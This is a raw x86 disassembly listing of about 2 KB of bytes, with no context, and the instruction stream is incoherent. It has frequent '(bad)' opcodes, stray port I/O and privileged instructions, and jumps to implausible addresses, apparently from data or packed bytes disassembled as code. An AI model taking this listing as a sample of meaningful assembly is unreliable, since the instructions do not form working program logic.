  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
